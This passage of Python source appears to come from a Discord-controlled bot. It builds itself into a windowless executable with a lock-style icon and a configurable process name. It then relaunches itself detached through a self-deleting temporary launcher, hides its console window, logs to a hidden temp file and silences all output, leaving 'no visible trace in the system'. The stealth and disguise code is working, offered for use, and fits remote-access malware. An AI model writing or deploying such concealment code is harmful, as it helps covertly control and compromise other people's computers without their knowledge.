        script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        build_dir = os.path.join(script_dir, "build")
        os.makedirs(build_dir, exist_ok=True)
        
        # Create icon if it doesn't exist
        icon_path = os.path.join(script_dir, "icon.ico")
        if not os.path.exists(icon_path):
            await ctx.send("🎨 Creating custom icon...")
            create_custom_icon(icon_path)
            await ctx.send(f"✅ Custom icon created at: {icon_path}")
        
        # Create build script
        build_script_path = os.path.join(script_dir, "build.bat")
        script_path = os.path.abspath(sys.argv[0])
        
        with open(build_script_path, "w") as f:
            f.write(f"""@echo off
echo Installing PyInstaller...
pip install pyinstaller

echo Building executable with custom icon...
pyinstaller --onefile --windowed --icon="{icon_path}" --name="{PROCESS_NAME}" "{script_path}"

echo Cleaning up...
rmdir /S /Q build
del /Q "{PROCESS_NAME}.spec"

echo Moving executable to current directory...
move dist\\{PROCESS_NAME}.exe .\\{PROCESS_NAME}.exe
rmdir /S /Q dist

echo Done! Executable created: {PROCESS_NAME}.exe
pause
""")
        
        # Make the build script executable
        os.chmod(build_script_path, 0o755)
        
        await ctx.send(f"🔨 Build script created at: {build_script_path}")
        await ctx.send("To build the executable, run the build.bat script. This will create an executable file with a custom icon that will run completely hidden when executed.")
        
        # Execute the build script if on Windows
        if platform.system() == "Windows":
            await ctx.send("🚀 Starting build process...")
            build_process = subprocess.Popen([build_script_path], shell=True)
            await ctx.send("⏳ Build process started. This may take a few minutes...")
        
    except Exception as e:
        await ctx.send(f"❌ Error creating build script: {e}")
        logger.error(f"Build script error: {e}")

def create_custom_icon(icon_path):
    """Create a custom icon for the executable"""
    try:
        from PIL import Image, ImageDraw, ImageFont
        
        # Create a blank image with a dark background
        img = Image.new('RGBA', (256, 256), color=(40, 40, 40, 255))
        draw = ImageDraw.Draw(img)
        
        # Draw a shield/lock shape
        draw.ellipse((48, 48, 208, 208), fill=(70, 70, 70, 255), outline=(100, 100, 100, 255), width=3)
        draw.rectangle((94, 112, 162, 180), fill=(50, 120, 200, 255), outline=(70, 140, 230, 255), width=2)
        draw.rectangle((120, 90, 136, 112), fill=(50, 120, 200, 255), outline=(70, 140, 230, 255), width=2)
        
        # Save as ICO file
        img.save(icon_path, format='ICO', sizes=[(256, 256), (128, 128), (64, 64), (32, 32), (16, 16)])
        logger.info(f"Created custom icon at {icon_path}")
        return True
    except Exception as e:
        logger.error(f"Error creating icon: {e}")
        return False

# Function to launch a completely hidden subprocess and exit
def spawn_hidden_process():
    """Create a completely hidden subprocess and exit the current process"""
    script_path = os.path.abspath(sys.argv[0])
    
    # Create a temporary launcher script
    fd, temp_launcher = tempfile.mkstemp(suffix='.pyw')
    os.close(fd)
    
    # Write a launcher script that will start the bot without appearing in taskbar
    with open(temp_launcher, 'w') as f:
        f.write(f"""#!/usr/bin/env python
import subprocess
import os
import sys
import platform
import time

# Path to the bot script
bot_script = r"{script_path}"

if platform.system() == "Windows":
    # Use pythonw on Windows to avoid any window
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags = subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    
    # Create a detached process with no window
    subprocess.Popen(
        ["pythonw", bot_script, "--hidden"],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        shell=False
    )
else:
    # On Unix systems, fork and use nohup
    pid = os.fork()
    if pid > 0:
        # Parent process exits immediately
        sys.exit(0)
    
    # Child process continues and detaches completely
    os.setsid()
    os.umask(0)
    
    # Fork again to prevent zombie processes
    pid = os.fork()
    if pid > 0:
        sys.exit(0)
    
    # Redirect standard file descriptors
    sys.stdout.flush()
    sys.stderr.flush()
    
    with open(os.devnull, 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'a+') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    with open(os.devnull, 'a+') as f:
        os.dup2(f.fileno(), sys.stderr.fileno())
        
    # Execute the main script with --hidden flag
    os.execl(sys.executable, sys.executable, bot_script, "--hidden")

# Wait briefly then self-destruct this launcher
time.sleep(1)
try:
    os.remove(r"{temp_launcher}")
except:
    pass
sys.exit(0)
""")
    
    # Make the launcher executable
    os.chmod(temp_launcher, 0o755)
    
    # Execute the temp launcher in a detached process
    if platform.system() == "Windows":
        try:
            subprocess.Popen(["pythonw", temp_launcher], creationflags=subprocess.DETACHED_PROCESS)
        except:
            # Fallback method
            subprocess.Popen(["python", temp_launcher], shell=True)
    else:
        subprocess.Popen([sys.executable, temp_launcher], start_new_session=True)
    
    # Exit the current process
    sys.exit(0)

# Function to run the bot completely hidden
def run_completely_hidden():
    """Run the bot with no visible trace in the system"""
    # Check if this process was launched with the --hidden flag
    if "--hidden" not in sys.argv:
        # If not, spawn a hidden process and exit
        spawn_hidden_process()
    
    try:
        # Configure the logger to write to a hidden file instead of console
        log_dir = tempfile.gettempdir()  # Use system temp directory
        log_file = os.path.join(log_dir, f".{PROCESS_NAME}.log")  # Hidden log file
        
        # Configure file handler for logging
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        logger.handlers = [file_handler]  # Replace any existing handlers
        logger.info(f"Logging to hidden file: {log_file}")
        
        # Platform-specific hiding techniques
        if platform.system() == "Windows":
            try:
                # Import Windows-specific modules
                import ctypes
                
                # Hide console window for Windows completely
                kernel32 = ctypes.WinDLL('kernel32')
                user32 = ctypes.WinDLL('user32')
                
                # Get the console window handle
                hwnd = kernel32.GetConsoleWindow()
                
                # Hide the console window completely
                if hwnd != 0:
                    user32.ShowWindow(hwnd, 0)
                    # Additional technique to further hide the process
                    current_pid = os.getpid()
                    try:
                        # Set process priority to below normal to reduce resource impact
                        handle = kernel32.OpenProcess(0x0400, False, current_pid)  # PROCESS_SET_INFORMATION
                        kernel32.SetPriorityClass(handle, 0x00004000)  # BELOW_NORMAL_PRIORITY_CLASS
                        kernel32.CloseHandle(handle)
                    except:
                        pass
                    logger.info("Windows process completely hidden")
            except Exception as e:
                logger.error(f"Failed to hide Windows process: {e}")
        else:
            # Unix-like OS (Linux/Mac) hiding
            try:
                # Full redirection of all output streams
                devnull = open(os.devnull, 'w')
                os.dup2(devnull.fileno(), sys.stdout.fileno())
                os.dup2(devnull.fileno(), sys.stderr.fileno())
                
                # Detach from controlling terminal
                if hasattr(os, 'setsid'):
                    os.setsid()
                
                logger.info("Unix process completely hidden")
            except Exception as e:
                logger.error(f"Failed to hide Unix process: {e}")
        
        # Run the bot with all output supressed
        with open(os.devnull, 'w') as f:
            old_stdout = sys.stdout
            old_stderr = sys.stderr
            sys.stdout = f
            sys.stderr = f
            try:
                bot.run(TOKEN)
            finally:
                sys.stdout = old_stdout
                sys.stderr = old_stderr
    except Exception as e:
        logger.error(f"Bot startup error: {e}")

# Run the bot if this script is executed directly
if __name__ == "__main__":
    run_completely_hidden()
